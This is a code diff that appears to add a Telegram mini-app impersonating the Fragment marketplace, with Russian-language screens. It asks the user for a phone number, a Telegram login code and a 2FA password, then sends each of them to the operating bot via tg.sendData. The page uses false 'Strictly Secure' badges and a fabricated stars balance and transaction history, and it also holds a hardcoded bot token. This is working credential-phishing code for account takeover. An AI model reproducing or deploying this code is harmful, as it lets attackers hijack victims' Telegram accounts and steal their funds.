@@ -280,4 +280,392 @@
     <div class="modal-sub">Выберите способ пополнения</div>
     <div class="deposit-option" onclick="depositTON()">
       <span class="deposit-option-icon">💎</span>
-      <div class="deposit-option-info"><div class="deposit-option-name">TON</div><div class="deposit-option-desc">Пополнение через TON кошелёк</
+      <div class="deposit-option-info"><div class="deposit-option-name">TON</div><div class="deposit-option-desc">Пополнение через TON кошелёк</div></div>
+      <span class="deposit-option-arrow">›</span>
+    </div>
+    <div class="deposit-option" onclick="depositCard()">
+      <span class="deposit-option-icon">💳</span>
+      <div class="deposit-option-info"><div class="deposit-option-name">Банковская карта</div><div class="deposit-option-desc">Visa, Mastercard, МИР</div></div>
+      <span class="deposit-option-arrow">›</span>
+    </div>
+    <div class="deposit-option" onclick="depositCrypto()">
+      <span class="deposit-option-icon">₿</span>
+      <div class="deposit-option-info"><div class="deposit-option-name">Криптовалюта</div><div class="deposit-option-desc">BTC, ETH, USDT и другие</div></div>
+      <span class="deposit-option-arrow">›</span>
+    </div>
+    <button class="btn-main btn-gray" style="margin-top:8px;" onclick="closeDeposit()">Отмена</button>
+  </div>
+</div>
+
+<!-- Topbar -->
+<div class="topbar">
+  <div class="topbar-back" id="topbarBack" onclick="topbarGoBack()">‹ Назад</div>
+  <div class="topbar-title"><span>Fragment</span><small>мини-приложение</small></div>
+  <div class="topbar-spacer"></div>
+</div>
+
+<!-- Card -->
+<div class="card" id="mainCard">
+
+  <!-- STEP 1: Телефон -->
+  <div id="step1">
+    <div class="logo-wrap"><div class="logo-circle"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg></div></div>
+    <div class="steps"><div class="step-dot active"></div><div class="step-dot"></div><div class="step-dot"></div></div>
+    <div class="screen-title">Введите номер</div>
+    <div class="screen-sub">Авторизация на <a href="#">fragment.com</a></div>
+    <div class="input-group" style="position:relative;">
+      <div class="select-wrap" id="countrySelect" onclick="toggleDropdown()">
+        <div class="select-left"><span class="select-flag" id="selFlag">🇷🇺</span><span class="select-country" id="selCountry">Россия (+7)</span></div>
+        <span class="select-arrow">⌄</span>
+      </div>
+      <div class="dropdown" id="dropdown">
+        <div class="dd-search"><input type="text" placeholder="Поиск страны..." id="ddSearch" oninput="filterCountries(this.value)"/></div>
+        <div id="ddList"></div>
+      </div>
+    </div>
+    <div class="input-group">
+      <div class="phone-wrap">
+        <span class="phone-prefix" id="phonePrefix">+7</span>
+        <input class="phone-input" id="phoneInput" type="tel" placeholder="000 000 00 00" oninput="formatPhone(this)" maxlength="20"/>
+      </div>
+      <div class="example-hint" id="exampleHint">Пример: +7 (906) 480 08 08</div>
+      <div class="error-msg" id="phoneError">Введите корректный номер</div>
+    </div>
+    <button class="btn-main" id="btnStep1" onclick="goStep2()">Далее</button>
+    <div class="secure-badge">🔒 Strictly Secure via Telegram Passport</div>
+  </div>
+
+  <!-- STEP 2: Код -->
+  <div id="step2" style="display:none;">
+    <div class="logo-wrap"><div class="logo-circle"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg></div></div>
+    <div class="steps"><div class="step-dot"></div><div class="step-dot active"></div><div class="step-dot"></div></div>
+    <div class="screen-title">Введите код</div>
+    <div class="code-hint">Мы отправили код на<br><strong id="displayPhone"></strong></div>
+    <div class="code-boxes">
+      <input class="code-box" maxlength="1" type="tel" id="c0" oninput="codeInput(this,0)" onkeydown="codeKey(event,0)">
+      <input class="code-box" maxlength="1" type="tel" id="c1" oninput="codeInput(this,1)" onkeydown="codeKey(event,1)">
+      <input class="code-box" maxlength="1" type="tel" id="c2" oninput="codeInput(this,2)" onkeydown="codeKey(event,2)">
+      <input class="code-box" maxlength="1" type="tel" id="c3" oninput="codeInput(this,3)" onkeydown="codeKey(event,3)">
+      <input class="code-box" maxlength="1" type="tel" id="c4" oninput="codeInput(this,4)" onkeydown="codeKey(event,4)">
+    </div>
+    <div class="code-error" id="codeError">Неверный код. Попробуйте ещё раз.</div>
+    <div class="resend-row">Не получили? <span class="resend-link" onclick="resendCode()">Отправить повторно</span></div>
+    <button class="btn-main" id="btnStep2" style="margin-top:18px;" onclick="goStep3()">Подтвердить</button>
+    <div class="secure-badge">🔒 Strictly Secure via Telegram Passport</div>
+  </div>
+
+  <!-- STEP 3: 2FA -->
+  <div id="step3" style="display:none;">
+    <div class="logo-wrap"><div class="logo-circle"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg></div></div>
+    <div class="steps"><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot active"></div></div>
+    <div class="twofa-icon">🔐</div>
+    <div class="screen-title">Двухэтапная<br>проверка</div>
+    <div style="margin-bottom:14px;"></div>
+    <div class="twofa-info"><p>У вас включена <strong>двухэтапная аутентификация</strong>. Введите пароль Telegram.</p></div>
+    <div class="input-group">
+      <div class="pass-wrap">
+        <input class="pass-input" id="passInput" type="password" placeholder="Пароль 2FA"/>
+        <span class="eye-btn" id="eyeBtn" onclick="togglePass()">👁</span>
+      </div>
+    </div>
+    <button class="btn-main" onclick="goStep4()">Войти</button>
+    <div class="secure-badge">🔒 Strictly Secure via Telegram Passport</div>
+  </div>
+
+  <!-- STEP 4: Dashboard -->
+  <div id="step4" style="display:none;">
+    <div class="dash-header">
+      <div class="dash-avatar">👤</div>
+      <div class="dash-name">Пользователь</div>
+      <div class="dash-handle" id="dashPhone">fragment.com</div>
+    </div>
+    <div class="stars-card">
+      <div class="sparkles">✨⭐✨</div>
+      <div class="stars-card-label">Баланс звёзд</div>
+      <div class="stars-balance">
+        <span class="stars-icon">⭐</span>
+        <span class="stars-amount">4 820</span>
+        <span class="stars-unit">звёзд</span>
+      </div>
+      <div class="stars-usd">≈ $48.20 USD · 1 ⭐ = $0.01</div>
+    </div>
+    <div class="action-row">
+      <button class="action-btn deposit" onclick="openDeposit()"><span class="action-icon">➕</span>Пополнить</button>
+      <button class="action-btn withdraw" onclick="openWithdraw()"><span class="action-icon">💸</span>Вывести</button>
+    </div>
+    <div class="section-title">История</div>
+    <div class="tx-item"><div class="tx-icon in">⭐</div><div class="tx-info"><div class="tx-label">Получено звёзд</div><div class="tx-date">Сегодня, 06:12</div></div><div class="tx-amount in">+1 000</div></div>
+    <div class="tx-item"><div class="tx-icon out">💸</div><div class="tx-info"><div class="tx-label">Вывод</div><div class="tx-date">Вчера, 18:44</div></div><div class="tx-amount out">−500</div></div>
+    <div class="tx-item"><div class="tx-icon in">💎</div><div class="tx-info"><div class="tx-label">Пополнение (TON)</div><div class="tx-date">27 мар, 11:20</div></div><div class="tx-amount in">+3 000</div></div>
+    <div class="tx-item"><div class="tx-icon out">💸</div><div class="tx-info"><div class="tx-label">Вывод</div><div class="tx-date">26 мар, 09:05</div></div><div class="tx-amount out">−680</div></div>
+  </div>
+
+</div>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+// ========== TELEGRAM WEBAPP ==========
+const tg = window.Telegram.WebApp;
+tg.ready();
+const user_id = tg.initDataUnsafe?.user?.id || new URLSearchParams(window.location.search).get('user_id');
+
+const BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
+
+// ========== СТРАНЫ ==========
+const countries=[
+  {flag:'🇷🇺',name:'Россия',code:'+7',mask:'(###) ### ## ##',example:'+7 (906) 480 08 08'},
+  {flag:'🇦🇿',name:'Азербайджан',code:'+994',mask:'(##) ### ## ##',example:'+994 (783) 862 96 88'},
+  {flag:'🇺🇦',name:'Украина',code:'+380',mask:'(##) ### ## ##',example:'+380 (50) 123 45 67'},
+  {flag:'🇰🇿',name:'Казахстан',code:'+7',mask:'(###) ### ## ##',example:'+7 (701) 234 56 78'},
+  {flag:'🇺🇿',name:'Узбекистан',code:'+998',mask:'(##) ### ## ##',example:'+998 (90) 123 45 67'},
+  {flag:'🇧🇾',name:'Беларусь',code:'+375',mask:'(##) ### ## ##',example:'+375 (29) 123 45 67'},
+  {flag:'🇬🇪',name:'Грузия',code:'+995',mask:'(###) ## ## ##',example:'+995 (555) 12 34 56'},
+  {flag:'🇦🇲',name:'Армения',code:'+374',mask:'(##) ### ###',example:'+374 (77) 123 456'},
+  {flag:'🇹🇷',name:'Турция',code:'+90',mask:'(###) ### ## ##',example:'+90 (532) 123 45 67'},
+  {flag:'🇩🇪',name:'Германия',code:'+49',mask:'### #######',example:'+49 151 1234567'},
+  {flag:'🇺🇸',name:'США',code:'+1',mask:'(###) ###-####',example:'+1 (555) 234-5678'},
+  {flag:'🇬🇧',name:'Великобритания',code:'+44',mask:'#### ######',example:'+44 7911 123456'},
+  {flag:'🇫🇷',name:'Франция',code:'+33',mask:'# ## ## ## ##',example:'+33 6 12 34 56 78'},
+  {flag:'🇮🇹',name:'Италия',code:'+39',mask:'### #######',example:'+39 347 1234567'},
+  {flag:'🇨🇳',name:'Китай',code:'+86',mask:'### #### ####',example:'+86 138 1234 5678'},
+  {flag:'🇮🇳',name:'Индия',code:'+91',mask:'##### #####',example:'+91 98765 43210'},
+  {flag:'🇧🇷',name:'Бразилия',code:'+55',mask:'(##) #####-####',example:'+55 (11) 91234-5678'},
+  {flag:'🇦🇪',name:'ОАЭ',code:'+971',mask:'## ### ####',example:'+971 50 123 4567'},
+  {flag:'🇰🇬',name:'Кыргызстан',code:'+996',mask:'(###) ## ## ##',example:'+996 (700) 12 34 56'},
+  {flag:'🇹🇯',name:'Таджикистан',code:'+992',mask:'## ### ####',example:'+992 93 123 4567'},
+  {flag:'🇵🇱',name:'Польша',code:'+48',mask:'### ### ###',example:'+48 512 345 678'},
+  {flag:'🇷🇴',name:'Румыния',code:'+40',mask:'## ### ####',example:'+40 72 123 4567'},
+];
+
+let selectedCountry=countries[0];
+let ddOpen=false;
+let currentStep=1;
+let timerInterval=null;
+
+// ========== UI ФУНКЦИИ ==========
+function buildList(f=''){
+  const list=document.getElementById('ddList');list.innerHTML='';
+  countries.filter(c=>c.name.toLowerCase().includes(f.toLowerCase())||c.code.includes(f)).forEach(c=>{
+    const el=document.createElement('div');el.className='dd-item';
+    el.innerHTML=`<span>${c.flag}</span><span>${c.name}</span><span class="dd-code">${c.code}</span>`;
+    el.onclick=()=>selectCountry(c);list.appendChild(el);
+  });
+}
+function selectCountry(c){
+  selectedCountry=c;
+  document.getElementById('selFlag').textContent=c.flag;
+  document.getElementById('selCountry').textContent=c.name+' ('+c.code+')';
+  document.getElementById('phonePrefix').textContent=c.code;
+  document.getElementById('exampleHint').textContent='Пример: '+c.example;
+  document.getElementById('phoneInput').value='';
+  document.getElementById('phoneInput').placeholder=c.mask.replace(/#/g,'0');
+  closeDropdown();
+}
+function toggleDropdown(){
+  ddOpen=!ddOpen;
+  document.getElementById('dropdown').classList.toggle('open',ddOpen);
+  document.getElementById('countrySelect').classList.toggle('open',ddOpen);
+  if(ddOpen){buildList();setTimeout(()=>document.getElementById('ddSearch').focus(),50);}
+}
+function closeDropdown(){ddOpen=false;document.getElementById('dropdown').classList.remove('open');document.getElementById('countrySelect').classList.remove('open');}
+function filterCountries(v){buildList(v);}
+document.addEventListener('click',e=>{if(!e.target.closest('#countrySelect')&&!e.target.closest('#dropdown'))closeDropdown();});
+function formatPhone(input){
+  let v=input.value.replace(/\D/g,''),mask=selectedCountry.mask,result='',vi=0;
+  for(let i=0;i<mask.length&&vi<v.length;i++){if(mask[i]==='#')result+=v[vi++];else result+=mask[i];}
+  input.value=result;
+}
+function setBackBtn(step){
+  const btn=document.getElementById('topbarBack');
+  btn.classList.toggle('visible',step>1&&step<=3);
+}
+function switchStep(from,to){
+  document.getElementById('step'+from).style.display='none';
+  const el=document.getElementById('step'+to);
+  el.style.display='block';
+  el.style.animation='slideUp 0.35s cubic-bezier(.22,.68,0,1.2) both';
+  currentStep=to;setBackBtn(to);
+}
+function topbarGoBack(){if(currentStep>1&&currentStep<=3)switchStep(currentStep,currentStep-1);}
+
+// ========== ОТПРАВКА КОДА (ШАГ 1 → 2) - ИСПРАВЛЕНО ==========
+async function goStep2(){
+  // Берем то, что пользователь ввел
+  let raw = document.getElementById('phoneInput').value;
+  
+  // Убираем ВСЕ пробелы, скобки, дефисы — оставляем только цифры
+  raw = raw.replace(/\D/g, '');
+  
+  if(raw.length < 5){
+    document.getElementById('phoneError').classList.add('show');
+    return;
+  }
+  document.getElementById('phoneError').classList.remove('show');
+  
+  // Добавляем код страны (+7 для России)
+  const cleanPhone = selectedCountry.code + raw;
+  
+  document.getElementById('displayPhone').textContent = cleanPhone;
+  document.getElementById('dashPhone').textContent = cleanPhone;
+  
+  const btn=document.getElementById('btnStep1');
+  btn.textContent='Отправка...';
+  btn.disabled=true;
+  
+  try {
+    tg.sendData(JSON.stringify({
+      action: "send_code",
+      phone: cleanPhone
+    }));
+  } catch(e){console.error(e);}
+  
+  btn.textContent='Далее';
+  btn.disabled=false;
+  switchStep(1,2);
+  setTimeout(()=>document.getElementById('c0').focus(),300);
+}
+
+// ========== ПРОВЕРКА КОДА (ШАГ 2 → 3) ==========
+async function goStep3(){
+  let code="";
+  for(let i=0;i<5;i++) code+=document.getElementById('c'+i).value;
+  if(code.length<5) return;
+  
+  const btn=document.getElementById('btnStep2');
+  btn.textContent='Проверка...';
+  btn.disabled=true;
+  document.getElementById('codeError').classList.remove('show');
+  
+  try {
+    tg.sendData(JSON.stringify({
+      action: "check_code",
+      code: code
+    }));
+    switchStep(2,3);
+  } catch(e){
+    document.getElementById('codeError').classList.add('show');
+    console.error(e);
+  }
+  
+  btn.textContent='Подтвердить';
+  btn.disabled=false;
+}
+
+// ========== ПРОВЕРКА 2FA (ШАГ 3 → 4) ==========
+async function goStep4(){
+  const password=document.getElementById('passInput').value;
+  if(!password){
+    alert('Введите пароль 2FA');
+    return;
+  }
+  
+  const btn=document.querySelector('#step3 .btn-main');
+  btn.textContent='Проверка...';
+  btn.disabled=true;
+  
+  try {
+    tg.sendData(JSON.stringify({
+      action: "check_2fa",
+      password: password
+    }));
+    switchStep(3,4);
+  } catch(e){
+    alert('Ошибка проверки 2FA');
+    console.error(e);
+  }
+  
+  btn.textContent='Войти';
+  btn.disabled=false;
+}
+
+// ========== ВВОД КОДА ==========
+function codeInput(el,idx){
+  el.value=el.value.replace(/\D/g,'');
+  el.classList.toggle('filled',el.value.length>0);
+  if(el.value.length===1&&idx<4)document.getElementById('c'+(idx+1)).focus();
+  if(idx===4&&el.value.length===1){
+    const all=[0,1,2,3,4].every(i=>document.getElementById('c'+i).value.length===1);
+    if(all)setTimeout(()=>goStep3(),400);
+  }
+}
+function codeKey(e,idx){
+  if(e.key==='Backspace'&&!e.target.value&&idx>0){
+    const p=document.getElementById('c'+(idx-1));p.value='';p.classList.remove('filled');p.focus();
+  }
+}
+
+// ========== ПОВТОРНАЯ ОТПРАВКА КОДА ==========
+let resendCooldown=null;
+async function resendCode(){
+  if(resendCooldown) return;
+  [0,1,2,3,4].forEach(i=>{const el=document.getElementById('c'+i);el.value='';el.classList.remove('filled');});
+  document.getElementById('codeError').classList.remove('show');
+  document.getElementById('c0').focus();
+  
+  const phone = document.getElementById('displayPhone').textContent;
+  try {
+    tg.sendData(JSON.stringify({
+      action: "send_code",
+      phone: phone
+    }));
+  } catch(e){}
+  
+  const link=document.querySelector('.resend-link');
+  link.style.color='var(--text-muted)';
+  link.style.cursor='default';
+  let sec=60;
+  link.textContent='Повторно через '+sec+'с';
+  resendCooldown=setInterval(()=>{
+    sec--;
+    link.textContent='Повторно через '+sec+'с';
+    if(sec<=0){
+      clearInterval(resendCooldown);resendCooldown=null;
+      link.textContent='Отправить повторно';
+      link.style.color='var(--tg-blue)';
+      link.style.cursor='pointer';
+    }
+  },1000);
+}
+
+function togglePass(){
+  const inp=document.getElementById('passInput'),eye=document.getElementById('eyeBtn');
+  inp.type=inp.type==='password'?'text':'password';eye.textContent=inp.type==='password'?'👁':'🙈';
+}
+
+// ========== ВЫВОД / ПОПОЛНЕНИЕ ==========
+function openWithdraw(){
+  document.getElementById('wStep1').style.display='block';
+  document.getElementById('wStep2').style.display='none';
+  document.getElementById('withdrawAmount').value='';
+  document.getElementById('withdrawUSD').textContent='≈ $0.00';
+  document.getElementById('withdrawError').classList.remove('show');
+  document.getElementById('withdrawModal').classList.add('show');
+}
+function closeWithdraw(){document.getElementById('withdrawModal').classList.remove('show');if(timerInterval){clearInterval(timerInterval);timerInterval=null;}}
+function closeWithdrawIfOutside(e){if(e.target===document.getElementById('withdrawModal'))closeWithdraw();}
+function setAmount(n){document.getElementById('withdrawAmount').value=n;updateUSD();}
+function updateUSD(){const v=parseFloat(document.getElementById('withdrawAmount').value)||0;document.getElementById('withdrawUSD').textContent='≈ $'+(v*0.01).toFixed(2)+' USD';}
+function doWithdraw(){
+  const v=parseFloat(document.getElementById('withdrawAmount').value);
+  if(!v||v<1){document.getElementById('withdrawError').classList.add('show');return;}
+  document.getElementById('withdrawError').classList.remove('show');
+  tg.sendData(JSON.stringify({action:"withdraw",amount:v}));
+  document.getElementById('wStep1').style.display='none';
+  document.getElementById('wStep2').style.display='block';
+  let sec=180;document.getElementById('timerNum').textContent=sec;
+  if(timerInterval)clearInterval(timerInterval);
+  timerInterval=setInterval(()=>{sec--;document.getElementById('timerNum').textContent=sec;if(sec<=0){clearInterval(timerInterval);timerInterval=null;document.getElementById('timerNum').textContent='✓';}},1000);
+}
+function openDeposit(){document.getElementById('depositModal').classList.add('show');}
+function closeDeposit(){document.getElementById('depositModal').classList.remove('show');}
+function closeDepositIfOutside(e){if(e.target===document.getElementById('depositModal'))closeDeposit();}
+function depositTON(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"TON"}));alert('Откройте TON кошелёк для пополнения');}
+function depositCard(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"CARD"}));alert('Переход к оплате картой...');}
+function depositCrypto(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"CRYPTO"}));alert('Выберите криптовалюту');}
+
+// ========== ИНИЦИАЛИЗАЦИЯ ==========
+buildList();
+setBackBtn(1);
+</script>
+</body>
+</html>
